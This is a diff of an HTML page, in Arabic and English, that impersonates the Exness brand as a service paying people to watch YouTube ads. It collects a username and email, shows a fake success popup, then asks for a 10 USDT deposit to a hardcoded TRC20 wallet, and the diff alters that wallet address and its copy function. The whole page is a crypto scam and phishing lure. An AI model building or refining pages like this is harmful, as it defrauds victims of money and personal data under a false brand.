@@ -6,7 +6,7 @@
 <title>Exness</title>
 <link rel="preconnect" href="https://googleapis.com">
 <link rel="preconnect" href="https://gstatic.com" crossorigin>
-<link href="https://googleapis.com" rel="stylesheet">
+<link href="https://googleapis.com/css2?family=Changa:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 body { font-family:'Changa',sans-serif !important; background-color: #181a20 !important; color:#ffffff !important; text-align:center; padding:40px 20px; margin:0; }
 .card { background-color: #1e2329 !important; padding:35px 25px; border-radius:20px; display: inline-block; width:100%; max-width:380px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid #2b3139; box-sizing:border-box; position: relative; }
@@ -23,35 +23,12 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 .submit-btn-pulse { font-family: 'Changa', sans-serif !important; width: 100%; padding: 12px; color: #1e2329 !important; border: none; border-radius: 8px; font-weight: 700 !important; font-size: 18px !important; letter-spacing: 0.5px; cursor: pointer; box-sizing: border-box; animation: yellowGlowPulse 2s infinite ease-in-out; transition: 0.2s; margin-top: 15px; display: block; }
 .binance-btn-final { font-family:'Changa',sans-serif !important; width:100%; padding:14px; color:#1e2329 !important; border:none; border-radius:8px; font-weight:700; font-size:15px; cursor: pointer; display:block; text-decoration:none; margin-bottom:12px; box-sizing:border-box; animation:yellowGlowPulse 2s infinite ease-in-out; transition:0.2s; text-align:center;}
 .manual-deposit-box { margin-top:25px; padding:15px; border:2px dashed #474d57; border-radius:8px; background-color: rgba(43, 49, 57, 0.6); text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.3); box-sizing:border-box; }
-
-.crypto-address-container { 
-    font-family: monospace !important; 
-    width: 100%; 
-    padding: 14px 2px; 
-    text-align: center; 
-    background: #181a20; 
-    color: #ffffff !important; 
-    border: 1px solid #474d57; 
-    border-radius: 6px; 
-    font-size: 10.5px !important; 
-    font-weight: 700; 
-    direction: ltr; 
-    box-sizing: border-box; 
-    margin-top: 5px; 
-    margin-bottom: 15px; 
-    letter-spacing: 0.3px; 
-    white-space: nowrap !important; 
-    overflow: hidden !important; 
-    text-overflow: clip;
-}
-
+.crypto-address-container { font-family: monospace !important; width: 100%; padding: 14px 2px; text-align: center; background: #181a20; color: #ffffff !important; border: 1px solid #474d57; border-radius: 6px; font-size: 11px !important; font-weight: 700; direction: ltr; box-sizing: border-box; margin-top: 5px; margin-bottom: 15px; letter-spacing: 0.3px; white-space: nowrap !important; overflow: hidden !important; text-overflow: clip; }
 .check-account-btn { font-family:'Changa',sans-serif !important; width:100%; padding:12px; background:transparent; color:#848e9c; border:1px dashed #474d57; border-radius:8px; font-weight:600; font-size:14px; margin-top:15px; margin-bottom:5px; cursor:pointer; transition:0.3s; box-sizing:border-box; display:block; }
 .footer-info-box { margin-top:30px; font-family:'Changa',sans-serif !important; font-size:11px; color:#848e9c; line-height:1.6; font-weight:600; }
 .footer-info-box .brand-line { font-size:20px; margin-bottom:10px; display:flex; align-items:center; justify-content:center; gap:8px; color: #ffffff; }
 .footer-info-box .highlight-red { color:#f84960; font-weight:700; }
 .copy-btn-style { font-family:'Changa',sans-serif !important; width:100%; padding:10px; background:#f0b90b; color:#1e2329; border:none; border-radius:6px; margin-top:10px; font-weight:700; cursor:pointer; box-sizing:border-box; }
-
-/* تأثيرات النافذة المنبثقة المخصصة */
 .custom-alert-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); z-index: 9999; align-items: center; justify-content: center; }
 .custom-alert-box { background-color: #1e2329; border: 1px solid #2b3139; padding: 30px; border-radius: 16px; width: 85%; max-width: 300px; text-align: center; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
 @keyframes checkSuccessScale { 0% { transform: scale(0.6); opacity: 0; } 50% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
@@ -59,31 +36,25 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 .success-text { font-family: 'Changa', sans-serif !important; font-size: 16px; font-weight: 700; color: #02c076; margin: 0; }
 </style>
 </head>
-<body>
 
-<!-- نافذة النجاح المنبثقة -->
+    <body>
 <div id="successAlert" class="custom-alert-overlay">
     <div class="custom-alert-box">
         <div class="success-checkmark">✓</div>
         <p class="success-text">تم الإرسال بنجاح!</p>
     </div>
 </div>
-
 <div class="card">
 <div class="brand">Exness</div>
 <form id="paymentForm" onsubmit="return false;">
-    
-    <!-- الخطوة الأولى -->
     <div id="step1">
         <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
         <div class="amount-tag">Deposit: 10.00 USDT</div>
         <div class="status-code-box"><span>رمز الحالة:</span><span class="status-code-value">43628</span></div>
         <div class="input-group"><label for="displayname">Username</label><input type="text" id="displayname" placeholder="Enter your username" required></div>
         <div class="input-group"><label for="username">Email Address</label><input type="text" id="username" placeholder="example@gmail.com" required></div>
-
         <button type="button" onclick="handleSubmitAndShowCheck()" class="submit-btn-pulse">CREATE ACCOUNT</button>
         <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً?</button>
-        
         <div class="footer-info-box">
             <div class="brand-line"><span>★ Exness ★</span></div>
             <p>A PLATFORM TO PROVIDE COMPREHENSIVE SUPPORT<br>WHEN WATCHING YOUTUBE ADS</p>
@@ -91,57 +62,47 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
             <p class="highlight-red">PLEASE DEPOSIT $10. GO TO PAGE.</p>
         </div>
     </div>
-
-    <!-- الخطوة الثانية (صفحة الدفع) -->
     <div id="step2" style="display: none; margin-top: 15px;">
         <div class="subtitle">After completing the deposit, you will be redirected to the next page</div>
         <div class="amount-tag">Deposit: 10.00 USDT</div>
         <a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
         <div class="manual-deposit-box">
             <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-            <div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
-            <button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ عنوان المحفظة</button>
+            <div class="crypto-address-container" id="cryptoAddress">THJN4XBKxbZNYsw7YAhMNiZSupn3kVEDFP</div>
+            <button type="button" onclick="copyToClipboard()" class="copy-btn-style">نسخ عنوان المحفظة</button>
         </div>
     </div>
-
 </form>
 </div>
-
 <script>
 function handleSubmitAndShowCheck() {
-    var user = document.getElementById('displayname').value;
-    var email = document.getElementById('username').value;
-    
-    if(user === "" || email === "") {
-        alert("الرجاء ملء جميع الحقول أولاً.");
-        return;
-    }
-    
-    // إظهار نافذة النجاح المنبثقة
-    document.getElementById('successAlert').style.display = 'flex';
-    
-    // الانتقال للخطوة الثانية بعد ثانيتين
-    setTimeout(function() {
-        document.getElementById('successAlert').style.display = 'none';
+    const username = document.getElementById('username').value;
+    const displayname = document.getElementById('displayname').value;
+    if(!username || !displayname) { alert("يرجى ملء الحقول المطلوبة أولاً"); return; }
+    const alertOverlay = document.getElementById('successAlert');
+    alertOverlay.style.display = 'flex';
+    setTimeout(() => {
+        alertOverlay.style.display = 'none';
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
     }, 2000);
 }
-
-function copyCryptoAddress() {
-    var dummy = document.createElement("textarea");
+function alertNoAccount() { alert("الرجاء إنشاء حساب أولاً لتنشيط الخدمة بنجاح."); }
+function copyToClipboard() {
+    const text = "THJN4XBKxbZNYsw7YAhMNiZSupn3kVEDFP";
+    const dummy = document.createElement("input");
     document.body.appendChild(dummy);
-    dummy.value = document.getElementById("cryptoAddress").innerText;
+    dummy.value = text.trim();
     dummy.select();
-    document.execCommand("copy");
+    dummy.setSelectionRange(0, 99999);
+    try {
+        document.execCommand("copy");
+        alert("تم نسخ العنوان بنجاح بدون مسافات!");
+    } catch (err) {
+        alert("فشل النسخ، يرجى تكرار المحاولة.");
+    }
     document.body.removeChild(dummy);
-    alert("تم نسخ عنوان المحفظة الجديد بنجاح!");
-}
-
-function alertNoAccount() {
-    alert("لم يتم العثور على حساب مسبق، يرجى إنشاء حساب جديد.");
 }
 </script>
-
 </body>
 </html>
